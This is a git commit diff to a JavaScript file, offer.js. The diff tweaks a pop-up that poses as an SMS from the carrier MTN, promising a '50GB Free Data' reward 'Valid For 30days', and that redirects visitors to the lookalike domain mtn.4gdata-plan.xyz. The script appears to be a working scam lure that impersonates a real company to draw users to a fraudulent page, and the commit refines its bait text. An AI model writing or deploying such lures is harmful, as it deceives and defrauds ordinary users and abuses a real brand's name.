3d5b6f8452b165df442052b545eba8688ca37e67
essac5523me <essac5523+me@gmail.com>
2025-03-29 21:06:06 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '50GB DATA'
-password=prompt('SMS: Congratulations You are Eligible to receive 50GB Free Data MTN OLD SIM CARD REWARD, Kindly Press OK to ACTIVATE ','50GB DATA');
+password=prompt('SMS: Congratulations You are Eligible to receive 50GB Free Data MTN OLD SIM CARD REWARD Valid For 30days, Kindly Press OK to ACTIVATE ','50GB DATA');
 if (password != '50GB DATA') {
 location.href='https://mtn.4gdata-plan.xyz/50GB';
 }
